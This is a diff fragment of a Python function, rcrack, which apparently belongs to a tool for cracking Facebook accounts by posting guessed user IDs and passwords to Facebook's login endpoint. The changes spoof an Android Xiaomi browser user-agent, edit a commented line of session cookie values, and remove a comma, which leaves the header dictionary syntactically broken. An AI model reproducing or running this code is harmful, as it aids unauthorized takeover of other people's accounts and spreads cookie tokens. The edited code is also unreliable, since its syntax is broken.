@@ -460,7 +460,7 @@ def rcrack(uid,pwx,tl):
 
 			"login":"Log In"}
 
-			header_freefb = {'authority': 'web.facebook.com',
+			header_freefb = {'authority': 'web.facebook.com'
 
             'method':'GET',
 
@@ -474,9 +474,11 @@ def rcrack(uid,pwx,tl):
 
             'cache-control': 'max-age=0',
 
-            # 'cookie': 'datr=X4nCYzUNm42s8VoAmwVISJIL; sb=X4nCY7J-ZS9RRTEl2046fmri; dpr=2.4750001430511475; fr=0G5DHrfcH504g8zYb..Bjwolf.5h.AAA.0.0.Bjwomd.AWU5Ctrn3N4; wd=980x1872',
+             # 'cookie': 'datr=X4nCYzUNm42s8VoAmwVISJIL; sb=X4nCY7J-ZS9RRTEl2046fmri; dpr=2.4750001430511475; m_pixel_ratio=2.4750001430511475; fr=0G5DHrfcH504g8zYb..Bjwolf.5h.AAA.0.0.Bjw4wS.AWX_owLoTzQ; wd=980x1872',
 
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+
+            'sec-ch-ua-mobile': '?0',
 
             'sec-ch-ua-platform': '"Linux"',
 
@@ -490,7 +492,7 @@ def rcrack(uid,pwx,tl):
 
             'upgrade-insecure-requests': '1',
 
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (Linux; U; Android 11; ru-ru; Redmi Note 10 Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.8.3-gn',}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 
 			log_cookies=session.cookies.get_dict().keys()
